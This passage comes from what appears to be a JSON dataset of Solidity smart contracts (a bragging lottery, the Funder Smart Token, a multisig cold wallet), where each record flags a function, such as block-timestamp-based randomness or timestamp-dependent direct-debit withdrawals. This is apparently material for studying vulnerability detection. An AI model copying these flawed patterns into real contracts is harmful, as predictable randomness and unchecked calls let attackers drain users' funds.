getFineLevelOfAddress(address _user) public view returns(uint256 _fineLevel, uint256 _fineAmount){\n _fineLevel = fineLevel[_user];\n _fineAmount = _fineLevel * basicFine;\n return (_fineLevel, _fineAmount);\n }\n function getFineLevelOfUsername(string _username) public view returns(uint256 _fineLevel, uint256 _fineAmount){\n address _user = userNameToUserWallet[_username];\n _fineLevel = fineLevel[_user];\n _fineAmount = _fineLevel * basicFine;\n return (_fineLevel, _fineAmount);\n }\n function getTotalBrags() public view returns(uint256){\n return totalbrags;\n }\n function getWinnerPot() public view returns(uint256){\n return winningpot;\n }\n function getCurrentPot() public view returns (uint256 _amount){\n return address(this).balance;\n }\n function brag() public payable{\n uint256 shortage = SafeMath.mul(30,SafeMath.div(msg.value, 100));\n if(braggers.length != 0){\n require(braggers[braggers.length-1].braggedAmount < msg.value);\n }\n Bragger memory _bragger = Bragger({\n braggerAddress: msg.sender,\n braggedAmount: msg.value,\n braggerQuote: initialQuote\n });\n braggers.push(_bragger);\n totalBraggedValue = totalBraggedValue + msg.value;\n winningpot = winningpot + SafeMath.sub(msg.value, shortage);\n bragAddress.transfer(shortage);\n if(random() == random2()){\n address sender = msg.sender;\n sender.transfer(SafeMath.mul(SafeMath.div(address(this).balance,100), 70));\n uint256 luckyIndex = random3();\n address luckyGuy = braggers[luckyIndex].braggerAddress;\n luckyGuy.transfer(address(this).balance);\n }\n blocks = SafeMath.add(blocks, random());\n totalbrags += 1;\n }\n function setTheKingsQuote(string _message) public payable{\n if(fineLevel[msg.sender] > 0){\n require(msg.value > (basicFine * fineLevel[msg.sender]));\n }\n address currentKing = braggers[braggers.length-1].braggerAddress;\n require(msg.sender == currentKing);\n braggers[braggers.length-1].braggerQuote = _message;\n }\n function isAlreadyUser(address _address) public view returns (bool status){\n if (isUser[_address]){\n return true;\n } else {\n return false;\n }\n }\n function hasProfilePicture(address _address) public view returns (bool status){\n if (isUser[_address]){\n return true;\n } else {\n return false;\n }\n }\n function createNewUser(string _username, string _pictureUrl) public {\n require(!isAlreadyUser(msg.sender));\n User memory _user = User({\n userAddress: msg.sender,\n userName: _username\n });\n userWalletToUserName[msg.sender] = _username;\n userNameToUserWallet[_username] = msg.sender;\n userNameToPicture[_username] = _pictureUrl;\n userWalletToPicture[msg.sender] = _pictureUrl;\n fineLevel[msg.sender] = 0;\n users.push(_user) - 1;\n isUser[msg.sender] = true;\n hasPicture[msg.sender] = true;\n }\n function resetQuote()public onlyCreator{\n braggers[braggers.length-1].braggerQuote = initialQuote;\n fineLevel[braggers[braggers.length-1].braggerAddress] = fineLevel[braggers[braggers.length-1].braggerAddress] + 1;\n }\n function resetUsername(string _username)public onlyCreator{\n address user = userNameToUserWallet[_username];\n userWalletToUserName[user] = \"Mick\";\n fineLevel[user] = fineLevel[user] + 1;\n }\n function resetUserPicture(string _username)public onlyCreator{\n address user = userNameToUserWallet[_username];\n userWalletToPicture[user] = initialPicture;\n fineLevel[user] = fineLevel[user] + 1;\n }\n function _transfer(address _from, address _to, uint _value) internal {\n require(_to != 0x0);\n require(balanceOf[_from] >= _value);\n require(balanceOf[_to] + _value > balanceOf[_to]);\n uint previousBalances = balanceOf[_from] + balanceOf[_to];\n balanceOf[_from] -= _value;\n balanceOf[_to] += _value;\n emit Transfer(_from, _to, _value);\n assert(balanceOf[_from] + balanceOf[_to] == previousBalances);\n }\n function transfer(address _to, uint256 _value) public {\n _transfer(msg.sender, _to, _value);\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n require(_value <= allowance[_from][msg.sender]);\n allowance[_from][msg.sender] -= _value;\n _transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public\n returns (bool success) {\n allowance[msg.sender][_spender] = _value;\n return true;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData)\n public\n returns (bool success) {\n tokenRecipient spender = tokenRecipient(_spender);\n if (approve(_spender, _value)) {\n spender.receiveApproval(msg.sender, _value, this, _extraData);\n return true;\n }\n }\n function reset()public onlyCreator {\n selfdestruct(ownerAddress);\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function random() private view returns (uint8) {\nreturn uint8(uint256(keccak256(block.timestamp, block.difficulty))%251);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ee5"
  },
  "filename": "2389.sol",
  "content": "pragma solidity ^0.4.24;\npragma experimental \"v0.5.0\";\npragma experimental ABIEncoderV2;\nlibrary AddressExtension {\n function isValid(address _address) internal pure returns (bool) {\n return 0 != _address;\n }\n function isAccount(address _address) internal view returns (bool result) {\n assembly {\n result := iszero(extcodesize(_address))\n }\n }\n function toBytes(address _address) internal pure returns (bytes b) {\n assembly {\n let m := mload(0x40)\n mstore(add(m, 20), xor(0x140000000000000000000000000000000000000000, _address))\n mstore(0x40, add(m, 52))\n b := m\n }\n }\n}\nlibrary Math {\n struct Fraction {\n uint256 numerator;\n uint256 denominator;\n }\n function isPositive(Fraction memory fraction) internal pure returns (bool) {\n return fraction.numerator > 0 && fraction.denominator > 0;\n }\n function mul(uint256 a, uint256 b) internal pure returns (uint256 r) {\n r = a * b;\n require((a == 0) || (r / a == b));\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256 r) {\n r = a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256 r) {\n require((r = a - b) <= a);\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 r) {\n require((r = a + b) >= a);\n }\n function min(uint256 x, uint256 y) internal pure returns (uint256 r) {\n return x <= y ? x : y;\n }\n function max(uint256 x, uint256 y) internal pure returns (uint256 r) {\n return x >= y ? x : y;\n }\n function mulDiv(uint256 value, uint256 m, uint256 d) internal pure returns (uint256 r) {\n r = value * m;\n if (r / value == m) {\n r /= d;\n } else {\n r = mul(value / d, m);\n }\n }\n function mulDivCeil(uint256 value, uint256 m, uint256 d) internal pure returns (uint256 r) {\n r = value * m;\n if (r / value == m) {\n if (r % d == 0) {\n r /= d;\n } else {\n r = (r / d) + 1;\n }\n } else {\n r = mul(value / d, m);\n if (value % d != 0) {\n r += 1;\n }\n }\n }\n function mul(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDiv(x, f.numerator, f.denominator);\n }\n function mulCeil(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDivCeil(x, f.numerator, f.denominator);\n }\n function div(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDiv(x, f.denominator, f.numerator);\n }\n function divCeil(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDivCeil(x, f.denominator, f.numerator);\n }\n function mul(Fraction memory x, Fraction memory y) internal pure returns (Math.Fraction) {\n return Math.Fraction({\n numerator: mul(x.numerator, y.numerator),\n denominator: mul(x.denominator, y.denominator)\n });\n }\n}\ncontract FsTKAuthority {\n function isAuthorized(address sender, address _contract, bytes data) public view returns (bool);\n function isApproved(bytes32 hash, uint256 approveTime, bytes approveToken) public view returns (bool);\n function validate() public pure returns (bytes4);\n}\ncontract Authorizable {\n event SetFsTKAuthority(FsTKAuthority indexed _address);\n modifier onlyFsTKAuthorized {\n require(fstkAuthority.isAuthorized(msg.sender, this, msg.data));\n _;\n }\n modifier onlyFsTKApproved(bytes32 hash, uint256 approveTime, bytes approveToken) {\n require(fstkAuthority.isApproved(hash, approveTime, approveToken));\n _;\n }\n FsTKAuthority internal fstkAuthority;\n constructor(FsTKAuthority _fstkAuthority) internal {\n fstkAuthority = _fstkAuthority;\n }\n function setFsTKAuthority(FsTKAuthority _fstkAuthority) public onlyFsTKAuthorized {\n require(_fstkAuthority.validate() == _fstkAuthority.validate.selector);\n emit SetFsTKAuthority(fstkAuthority = _fstkAuthority);\n }\n}\ncontract ERC20 {\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n function balanceOf(address owner) public view returns (uint256);\n function allowance(address owner, address spender) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n}\ncontract SecureERC20 is ERC20 {\n event SetERC20ApproveChecking(bool approveChecking);\n function approve(address spender, uint256 expectedValue, uint256 newValue) public returns (bool);\n function increaseAllowance(address spender, uint256 value) public returns (bool);\n function decreaseAllowance(address spender, uint256 value, bool strict) public returns (bool);\n function setERC20ApproveChecking(bool approveChecking) public;\n}\ncontract FsTKToken {\n enum DelegateMode { PublicMsgSender, PublicTxOrigin, PrivateMsgSender, PrivateTxOrigin }\n event Consume(address indexed from, uint256 value, bytes32 challenge);\n event IncreaseNonce(address indexed from, uint256 nonce);\n event SetupDirectDebit(address indexed debtor, address indexed receiver, DirectDebitInfo info);\n event TerminateDirectDebit(address indexed debtor, address indexed receiver);\n event WithdrawDirectDebitFailure(address indexed debtor, address indexed receiver);\n event SetMetadata(string metadata);\n event SetLiquid(bool liquidity);\n event SetDelegate(bool isDelegateEnable);\n event SetDirectDebit(bool isDirectDebitEnable);\n struct DirectDebitInfo {\n uint256 amount;\n uint256 startTime;\n uint256 interval;\n }\n struct DirectDebit {\n DirectDebitInfo info;\n uint256 epoch;\n }\n struct Instrument {\n uint256 allowance;\n DirectDebit directDebit;\n }\n struct Account {\n uint256 balance;\n uint256 nonce;\n mapping (address => Instrument) instruments;\n }\n function spendableAllowance(address owner, address spender) public view returns (uint256);\n function transfer(uint256[] data) public returns (bool);\n function transferAndCall(address to, uint256 value, bytes data) public payable returns (bool);\n function nonceOf(address owner) public view returns (uint256);\n function increaseNonce() public returns (bool);\n function delegateTransferAndCall(\n uint256 nonce,\n uint256 fee,\n uint256 gasAmount,\n address to,\n uint256 value,\n bytes data,\n DelegateMode mode,\n uint8 v,\n bytes32 r,\n bytes32 s\n ) public returns (bool);\n function directDebit(address debtor, address receiver) public view returns (DirectDebit);\n function setupDirectDebit(address receiver, DirectDebitInfo info) public returns (bool);\n function terminateDirectDebit(address receiver) public returns (bool);\n function withdrawDirectDebit(address debtor) public returns (bool);\n function withdrawDirectDebit(address[] debtors, bool strict) public returns (bool);\n}\ncontract ERC20Like is SecureERC20, FsTKToken {\n using AddressExtension for address;\n using Math for uint256;\n modifier liquid {\n require(isLiquid);\n _;\n }\n modifier canUseDirectDebit {\n require(isDirectDebitEnable);\n _;\n }\n modifier canDelegate {\n require(isDelegateEnable);\n _;\n }\n bool public erc20ApproveChecking;\n bool public isLiquid = true;\n bool public isDelegateEnable;\n bool public isDirectDebitEnable;\n string public metadata;\n mapping(address => Account) internal accounts;\n constructor(string _metadata) public {\n metadata = _metadata;\n }\n function balanceOf(address owner) public view returns (uint256) {\n return accounts[owner].balance;\n }\n function allowance(address owner, address spender) public view returns (uint256) {\n return accounts[owner].instruments[spender].allowance;\n }\n function transfer(address to, uint256 value) public liquid returns (bool) {\n Account storage senderAccount = accounts[msg.sender];\n senderAccount.balance = senderAccount.balance.sub(value);\n accounts[to].balance += value;\n emit Transfer(msg.sender, to, value);\n return true;\n }\n function transferFrom(address from, address to, uint256 value) public liquid returns (bool) {\n Account storage fromAccount = accounts[from];\n Instrument storage senderInstrument = fromAccount.instruments[msg.sender];\n fromAccount.balance = fromAccount.balance.sub(value);\n senderInstrument.allowance = senderInstrument.allowance.sub(value);\n accounts[to].balance += value;\n emit Transfer(from, to, value);\n return true;\n }\n function approve(address spender, uint256 value) public returns (bool) {\n Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];\n if (erc20ApproveChecking) {\n require((value == 0) || (spenderInstrument.allowance == 0));\n }\n emit Approval(\n msg.sender,\n spender,\n spenderInstrument.allowance = value\n );\n return true;\n }\n function setERC20ApproveChecking(bool approveChecking) public {\n emit SetERC20ApproveChecking(erc20ApproveChecking = approveChecking);\n }\n function approve(address spender, uint256 expectedValue, uint256 newValue) public returns (bool) {\n Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];\n require(spenderInstrument.allowance == expectedValue);\n emit Approval(\n msg.sender,\n spender,\n spenderInstrument.allowance = newValue\n );\n return true;\n }\n function increaseAllowance(address spender, uint256 value) public returns (bool) {\n Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];\n emit Approval(\n msg.sender,\n spender,\n spenderInstrument.allowance = spenderInstrument.allowance.add(value)\n );\n return true;\n }\n function decreaseAllowance(address spender, uint256 value, bool strict) public returns (bool) {\n Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];\n uint256 currentValue = spenderInstrument.allowance;\n uint256 newValue;\n if (strict) {\n newValue = currentValue.sub(value);\n } else if (value < currentValue) {\n newValue = currentValue - value;\n }\n emit Approval(\n msg.sender,\n spender,\n spenderInstrument.allowance = newValue\n );\n return true;\n }\n function setMetadata0(string _metadata) internal {\n emit SetMetadata(metadata = _metadata);\n }\n function setLiquid0(bool liquidity) internal {\n emit SetLiquid(isLiquid = liquidity);\n }\n function setDelegate(bool delegate) public {\n emit SetDelegate(isDelegateEnable = delegate);\n }\n function setDirectDebit(bool directDebit) public {\n emit SetDirectDebit(isDirectDebitEnable = directDebit);\n }\n function spendableAllowance(address owner, address spender) public view returns (uint256) {\n Account storage ownerAccount = accounts[owner];\n return Math.min(\n ownerAccount.instruments[spender].allowance,\n ownerAccount.balance\n );\n }\n function transfer(uint256[] data) public liquid returns (bool) {\n Account storage senderAccount = accounts[msg.sender];\n uint256 totalValue;\n for (uint256 i = 0; i < data.length; i++) {\n address receiver = address(data[i] >> 96);\n uint256 value = data[i] & 0xffffffffffffffffffffffff;\n totalValue = totalValue.add(value);\n accounts[receiver].balance += value;\n emit Transfer(msg.sender, receiver, value);\n }\n senderAccount.balance = senderAccount.balance.sub(totalValue);\n return true;\n }\n function transferAndCall(\n address to,\n uint256 value,\n bytes data\n )\n public\n payable\n liquid\n returns (bool)\n {\n require(\n to != address(this) &&\n data.length >= 68 &&\n transfer(to, value)\n );\n assembly {\n mstore(add(data, 36), value)\n mstore(add(data, 68), caller)\n }\n require(to.call.value(msg.value)(data));\n return true;\n }\n function nonceOf(address owner) public view returns (uint256) {\n return accounts[owner].nonce;\n }\n function increaseNonce() public returns (bool) {\n emit IncreaseNonce(msg.sender, accounts[msg.sender].nonce += 1);\n }\n function delegateTransferAndCall(\n uint256 nonce,\n uint256 fee,\n uint256 gasAmount,\n address to,\n uint256 value,\n bytes data,\n DelegateMode mode,\n uint8 v,\n bytes32 r,\n bytes32 s\n )\n public\n liquid\n canDelegate\n returns (bool)\n {\n require(to != address(this));\n address signer;\n address relayer;\n if (mode == DelegateMode.PublicMsgSender) {\n signer = ecrecover(\n keccak256(abi.encodePacked(this, nonce, fee, gasAmount, to, value, data, mode, address(0))),\n v,\n r,\n s\n );\n relayer = msg.sender;\n } else if (mode == DelegateMode.PublicTxOrigin) {\n signer = ecrecover(\n keccak256(abi.encodePacked(this, nonce, fee, gasAmount, to, value, data, mode, address(0))),\n v,\n r,\n s\n );\n relayer = tx.origin;\n } else if (mode == DelegateMode.PrivateMsgSender) {\n signer = ecrecover(\n keccak256(abi.encodePacked(this, nonce, fee, gasAmount, to, value, data, mode, msg.sender)),\n v,\n r,\n s\n );\n relayer = msg.sender;\n } else if (mode == DelegateMode.PrivateTxOrigin) {\n signer = ecrecover(\n keccak256(abi.encodePacked(this, nonce, fee, gasAmount, to, value, data, mode, tx.origin)),\n v,\n r,\n s\n );\n relayer = tx.origin;\n } else {\n revert();\n }\n Account storage signerAccount = accounts[signer];\n require(nonce == signerAccount.nonce);\n emit IncreaseNonce(signer, signerAccount.nonce += 1);\n signerAccount.balance = signerAccount.balance.sub(value.add(fee));\n accounts[to].balance += value;\n if (fee != 0) {\n accounts[relayer].balance += fee;\n emit Transfer(signer, relayer, fee);\n }\n if (!to.isAccount() && data.length >= 68) {\n assembly {\n mstore(add(data, 36), value)\n mstore(add(data, 68), signer)\n }\n if (to.call.gas(gasAmount)(data)) {\n emit Transfer(signer, to, value);\n } else {\n signerAccount.balance += value;\n accounts[to].balance -= value;\n }\n } else {\n emit Transfer(signer, to, value);\n }\n return true;\n }\n function directDebit(address debtor, address receiver) public view returns (DirectDebit) {\n return accounts[debtor].instruments[receiver].directDebit;\n }\n function setupDirectDebit(\n address receiver,\n DirectDebitInfo info\n )\n public\n returns (bool)\n {\n accounts[msg.sender].instruments[receiver].directDebit = DirectDebit({\n info: info,\n epoch: 0\n });\n emit SetupDirectDebit(msg.sender, receiver, info);\n return true;\n }\n function terminateDirectDebit(address receiver) public returns (bool) {\n delete accounts[msg.sender].instruments[receiver].directDebit;\n emit TerminateDirectDebit(msg.sender, receiver);\n return true;\n }\n function withdrawDirectDebit(address debtor) public liquid canUseDirectDebit returns (bool) {\n Account storage debtorAccount = accounts[debtor];\n DirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit;\n uint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1);\n uint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount);\n require(amount > 0);\n debtorAccount.balance = debtorAccount.balance.sub(amount);\n accounts[msg.sender].balance += amount;\n debit.epoch = epoch;\n emit Transfer(debtor, msg.sender, amount);\n return true;\n }\n function withdrawDirectDebit(address[] debtors, bool strict) public liquid canUseDirectDebit returns (bool result) {\n Account storage receiverAccount = accounts[msg.sender];\n result = true;\n uint256 total;\n for (uint256 i = 0; i < debtors.length; i++) {\n address debtor = debtors[i];\n Account storage debtorAccount = accounts[debtor];\n DirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit;\n uint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1);\n uint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount);\n require(amount > 0);\n uint256 debtorBalance = debtorAccount.balance;\n if (amount > debtorBalance) {\n if (strict) {\n revert();\n }\n result = false;\n emit WithdrawDirectDebitFailure(debtor, msg.sender);\n } else {\n debtorAccount.balance = debtorBalance - amount;\n total += amount;\n debit.epoch = epoch;\n emit Transfer(debtor, msg.sender, amount);\n }\n }\n receiverAccount.balance += total;\n }\n}\ncontract FsTKAllocation {\n function initialize(uint256 _vestedAmount) public;\n}\ncontract FunderSmartToken is Authorizable, ERC20Like {\n string public constant name = \"Funder Smart Token\";\n string public constant symbol = \"FST\";\n uint256 public constant totalSupply = 330000000 ether;\n uint8 public constant decimals = 18;\n constructor(\n FsTKAuthority _fstkAuthority,\n string _metadata,\n address coldWallet,\n FsTKAllocation allocation\n )\n Authorizable(_fstkAuthority)\n ERC20Like(_metadata)\n public\n {\n uint256 vestedAmount = totalSupply / 12;\n accounts[allocation].balance = vestedAmount;\n emit Transfer(address(0), allocation, vestedAmount);\n allocation.initialize(vestedAmount);\n uint256 releaseAmount = totalSupply - vestedAmount;\n accounts[coldWallet].balance = releaseAmount;\n emit Transfer(address(0), coldWallet, releaseAmount);\n }\n function setMetadata(string infoUrl) public onlyFsTKAuthorized {\n setMetadata0(infoUrl);\n }\n function setLiquid(bool liquidity) public onlyFsTKAuthorized {\n setLiquid0(liquidity);\n }\n function setERC20ApproveChecking(bool approveChecking) public onlyFsTKAuthorized {\n super.setERC20ApproveChecking(approveChecking);\n }\n function setDelegate(bool delegate) public onlyFsTKAuthorized {\n super.setDelegate(delegate);\n }\n function setDirectDebit(bool directDebit) public onlyFsTKAuthorized {\n super.setDirectDebit(directDebit);\n }\n function transferToken(ERC20 erc20, address to, uint256 value) public onlyFsTKAuthorized {\n erc20.transfer(to, value);\n }\n}",
  "extract_feature": [
    "function withdrawDirectDebit(address debtor) public liquid canUseDirectDebit returns (bool) {\nAccount storage debtorAccount = accounts[debtor];\nDirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit;\nuint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1);\nuint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount);\nrequire(amount > 0);\ndebtorAccount.balance = debtorAccount.balance.sub(amount);\naccounts[msg.sender].balance += amount;\ndebit.epoch = epoch;\nemit Transfer(debtor, msg.sender, amount);\nreturn true;\n}",
    "function withdrawDirectDebit(address[] debtors, bool strict) public liquid canUseDirectDebit returns (bool result) {\nAccount storage receiverAccount = accounts[msg.sender];\nresult = true;\nuint256 total;\nfor (uint256 i = 0; i < debtors.length; i++) {\naddress debtor = debtors[i];\nAccount storage debtorAccount = accounts[debtor];\nDirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit;\nuint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1);\nuint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount);\nrequire(amount > 0);\nuint256 debtorBalance = debtorAccount.balance;\nif (amount > debtorBalance) {\nif (strict) {\nrevert();\n}\nresult = false;\nemit WithdrawDirectDebitFailure(debtor, msg.sender);\n} else {\ndebtorAccount.balance = debtorBalance - amount;\ntotal += amount;\ndebit.epoch = epoch;\nemit Transfer(debtor, msg.sender, amount);\n}\n}\nreceiverAccount.balance += total;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ee6"
  },
  "filename": "2391.sol",
  "content": "pragma solidity ^0.4.24;\npragma experimental \"v0.5.0\";\npragma experimental ABIEncoderV2;\nlibrary Math {\n struct Fraction {\n uint256 numerator;\n uint256 denominator;\n }\n function isPositive(Fraction memory fraction) internal pure returns (bool) {\n return fraction.numerator > 0 && fraction.denominator > 0;\n }\n function mul(uint256 a, uint256 b) internal pure returns (uint256 r) {\n r = a * b;\n require((a == 0) || (r / a == b));\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256 r) {\n r = a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256 r) {\n require((r = a - b) <= a);\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 r) {\n require((r = a + b) >= a);\n }\n function min(uint256 x, uint256 y) internal pure returns (uint256 r) {\n return x <= y ? x : y;\n }\n function max(uint256 x, uint256 y) internal pure returns (uint256 r) {\n return x >= y ? x : y;\n }\n function mulDiv(uint256 value, uint256 m, uint256 d) internal pure returns (uint256 r) {\n r = value * m;\n if (r / value == m) {\n r /= d;\n } else {\n r = mul(value / d, m);\n }\n }\n function mulDivCeil(uint256 value, uint256 m, uint256 d) internal pure returns (uint256 r) {\n r = value * m;\n if (r / value == m) {\n if (r % d == 0) {\n r /= d;\n } else {\n r = (r / d) + 1;\n }\n } else {\n r = mul(value / d, m);\n if (value % d != 0) {\n r += 1;\n }\n }\n }\n function mul(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDiv(x, f.numerator, f.denominator);\n }\n function mulCeil(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDivCeil(x, f.numerator, f.denominator);\n }\n function div(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDiv(x, f.denominator, f.numerator);\n }\n function divCeil(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDivCeil(x, f.denominator, f.numerator);\n }\n function mul(Fraction memory x, Fraction memory y) internal pure returns (Math.Fraction) {\n return Math.Fraction({\n numerator: mul(x.numerator, y.numerator),\n denominator: mul(x.denominator, y.denominator)\n });\n }\n}\ncontract FsTKColdWallet {\n using Math for uint256;\n event ConfirmationNeeded(address indexed initiator, bytes32 indexed operation, address indexed to, uint256 value, bytes data);\n event Confirmation(address indexed authority, bytes32 indexed operation);\n event Revoke(address indexed authority, bytes32 indexed operation);\n event AuthorityChanged(address indexed oldAuthority, address indexed newAuthority);\n event AuthorityAdded(address authority);\n event AuthorityRemoved(address authority);\n event RequirementChanged(uint256 required);\n event DayLimitChanged(uint256 dayLimit);\n event SpentTodayReset(uint256 spentToday);\n event Deposit(address indexed from, uint256 value);\n event SingleTransaction(address indexed authority, address indexed to, uint256 value, bytes data, address created);\n event MultiTransaction(address indexed authority, bytes32 indexed operation, address indexed to, uint256 value, bytes data, address created);\n struct TransactionInfo {\n address to;\n uint256 value;\n bytes data;\n }\n struct PendingTransactionState {\n TransactionInfo info;\n uint256 confirmNeeded;\n uint256 confirmBitmap;\n uint256 index;\n }\n modifier onlyAuthority {\n require(isAuthority(msg.sender));\n _;\n }\n modifier confirmAndRun(bytes32 operation) {\n if (confirmAndCheck(operation)) {\n _;\n }\n }\n uint256 constant MAX_AUTHORITIES = 250;\n uint256 public requiredAuthorities;\n uint256 public numAuthorities;\n uint256 public dailyLimit;\n uint256 public spentToday;\n uint256 public lastDay;\n address[256] public authorities;\n mapping(address => uint256) public authorityIndex;\n mapping(bytes32 => PendingTransactionState) public pendingTransaction;\n bytes32[] public pendingOperation;\n constructor(address[] _authorities, uint256 required, uint256 _daylimit) public {\n require(\n required > 0 &&\n authorities.length >= required\n );\n numAuthorities = _authorities.length;\n for (uint256 i = 0; i < _authorities.length; i += 1) {\n authorities[1 + i] = _authorities[i];\n authorityIndex[_authorities[i]] = 1 + i;\n }\n requiredAuthorities = required;\n dailyLimit = _daylimit;\n lastDay = today();\n }\n function() external payable {\n if (msg.value > 0) {\n emit Deposit(msg.sender, msg.value);\n }\n }\n function getAuthority(uint256 index) public view returns (address) {\n return authorities[index + 1];\n }\n function getAuthorityIndex(address authority) public view returns (uint256 index) {\n index = authorityIndex[authority];\n require(index > 0);\n }\n function isAuthority(address authority) public view returns (bool) {\n return authorityIndex[authority] > 0;\n }\n function hasConfirmed(bytes32 operation, address _address) public view returns (bool) {\n return (pendingTransaction[operation].confirmBitmap & (1 << getAuthorityIndex(_address))) != 0;\n }\n function changeAuthority(address from, address to) public confirmAndRun(keccak256(msg.data)) {\n require(!isAuthority(to));\n uint256 index = getAuthorityIndex(from);\n authorities[index] = to;\n authorityIndex[to] = index;\n delete authorityIndex[from];\n clearPending();\n emit AuthorityChanged(from, to);\n }\n function addAuthority(address authority) public confirmAndRun(keccak256(msg.data)) {\n require(!isAuthority(authority));\n if (numAuthorities >= MAX_AUTHORITIES) {\n reOrganizeAuthorities();\n }\n require(numAuthorities < MAX_AUTHORITIES);\n numAuthorities += 1;\n authorities[numAuthorities] = authority;\n authorityIndex[authority] = numAuthorities;\n clearPending();\n emit AuthorityAdded(authority);\n }\n function removeAuthority(address authority) public confirmAndRun(keccak256(msg.data)) {\n require(numAuthorities > requiredAuthorities);\n uint256 index = getAuthorityIndex(authority);\n delete authorities[index];\n delete authorityIndex[authority];\n clearPending();\n reOrganizeAuthorities();\n emit AuthorityRemoved(authority);\n }\n function setRequirement(uint256 required) public confirmAndRun(keccak256(msg.data)) {\n require(numAuthorities >= requiredAuthorities);\n clearPending();\n emit RequirementChanged(requiredAuthorities = required);\n }\n function setDailyLimit(uint256 _dailyLimit) public confirmAndRun(keccak256(msg.data)) {\n clearPending();\n emit DayLimitChanged(dailyLimit = _dailyLimit);\n }\n function resetSpentToday() public confirmAndRun(keccak256(msg.data)) {\n clearPending();\n emit SpentTodayReset(spentToday);\n delete spentToday;\n }\n function propose(\n address to,\n uint256 value,\n bytes data\n )\n public\n onlyAuthority\n returns (bytes32 operation)\n {\n if ((data.length == 0 && checkAndUpdateLimit(value)) || requiredAuthorities == 1) {\n emit SingleTransaction(msg.sender, to, value, data, execute0(to, value, data));\n } else {\n operation = keccak256(abi.encodePacked(msg.data, pendingOperation.length));\n PendingTransactionState storage status = pendingTransaction[operation];\n if (status.info.to == 0 && status.info.value == 0 && status.info.data.length == 0) {\n status.info = TransactionInfo({\n to: to,\n value: value,\n data: data\n });\n }\n if (!confirm(operation)) {\n emit ConfirmationNeeded(msg.sender, operation, to, value, data);\n }\n }\n }\n function revoke(bytes32 operation) public {\n uint256 confirmFlag = 1 << getAuthorityIndex(msg.sender);\n PendingTransactionState storage state = pendingTransaction[operation];\n if (state.confirmBitmap & confirmFlag > 0) {\n state.confirmNeeded += 1;\n state.confirmBitmap &= ~confirmFlag;\n emit Revoke(msg.sender, operation);\n }\n }\n function confirm(bytes32 operation) public confirmAndRun(operation) returns (bool) {\n PendingTransactionState storage status = pendingTransaction[operation];\n if (status.info.to != 0 || status.info.value != 0 || status.info.data.length != 0) {\n emit MultiTransaction(\n msg.sender,\n operation,\n status.info.to,\n status.info.value,\n status.info.data,\n execute0(status.info.to, status.info.value, status.info.data)\n );\n delete pendingTransaction[operation].info;\n return true;\n }\n }\n function execute0(\n address to,\n uint256 value,\n bytes data\n )\n private\n returns (address created)\n {\n if (to == 0) {\n created = create0(value, data);\n } else {\n require(to.call.value(value)(data));\n }\n }\n function create0(uint256 value, bytes code) internal returns (address _address) {\n assembly {\n _address := create(value, add(code, 0x20), mload(code))\n if iszero(extcodesize(_address)) {\n revert(0, 0)\n }\n }\n }\n function confirmAndCheck(bytes32 operation) private returns (bool) {\n PendingTransactionState storage pending = pendingTransaction[operation];\n if (pending.confirmNeeded == 0) {\n pending.confirmNeeded = requiredAuthorities;\n delete pending.confirmBitmap;\n pending.index = pendingOperation.length;\n pendingOperation.push(operation);\n }\n uint256 confirmFlag = 1 << getAuthorityIndex(msg.sender);\n if (pending.confirmBitmap & confirmFlag == 0) {\n emit Confirmation(msg.sender, operation);\n if (pending.confirmNeeded <= 1) {\n delete pendingOperation[pending.index];\n delete pending.confirmNeeded;\n delete pending.confirmBitmap;\n delete pending.index;\n return true;\n } else {\n pending.confirmNeeded -= 1;\n pending.confirmBitmap |= confirmFlag;\n }\n }\n }\n function checkAndUpdateLimit(uint256 value) private returns (bool) {\n if (today() > lastDay) {\n spentToday = 0;\n 